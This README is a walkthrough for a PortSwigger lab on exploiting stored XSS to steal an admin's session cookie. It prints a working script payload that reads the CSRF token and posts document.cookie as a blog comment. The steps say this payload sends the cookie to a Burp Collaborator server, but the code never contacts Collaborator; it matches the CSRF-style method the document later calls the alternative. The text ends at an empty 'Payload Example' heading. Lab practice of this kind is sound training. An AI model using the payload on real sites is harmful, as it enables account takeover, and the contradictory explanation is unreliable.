
# Lab: Exploiting Cross-Site Scripting to Steal Cookies

This README documents the solution and key details for the PortSwigger Web Security Academy lab: **"Exploiting cross-site scripting to steal cookies."**

---

## Lab Overview

- This lab features a stored XSS vulnerability in the blog comments functionality.
- A simulated victim (admin) views all comments after submission.
- The objective is to exploit XSS to steal the victim’s session cookie and impersonate the victim user.

---

## Solution Steps

1. **Prepare Burp Collaborator**

   - Open Burp Suite Professional and navigate to the Collaborator tab.
   - Click "Copy to clipboard" to obtain your unique Burp Collaborator subdomain.

2. **Submit the XSS Payload**

   - Post the following payload as a blog comment, replacing `BURP-COLLABORATOR-SUBDOMAIN` with your Collaborator subdomain:
     ```
     <script>window.addEventListener('DOMContentLoaded' , function(){
     var token = document.getElementsByName('csrf')[0].value
     var data = new FormData()

     data.append('csrf' , token);
     data.append('postId' , 5 );
     data.append('comment', document.cookie);
     data.append('name', 'Harish');
     data.append('email', 'harish@gmail.com');
     data.append('website','http://www.harish.com');
     fetch('/post/comment',{
         method: 'POST',
         mode: 'no-cors',
         body: data
     });
     });
     </script>
     ```
   - This script sends the victim's session cookie to your Collaborator server when their browser renders your comment.

3. **Wait for Victim Interaction**

   - After submitting the payload, return to the Collaborator tab and click "Poll now."
   - Look for HTTP interactions; the victim’s session cookie will appear in the POST body.

4. **Steal and Use Session Cookie**

   - Note the value of the victim’s session cookie from the HTTP request captured by Collaborator.
   - Reload the main blog page, and use Burp Proxy or Repeater to swap your session cookie for the stolen one.
   - Access `/my-account` to verify admin account access and solve the lab.

---

## Alternative Solution

- You could use the XSS to make the victim post their cookie as a comment (CSRF-based), but this is less stealthy and exposes the attack to the victim and admins.

---

## Payload Example

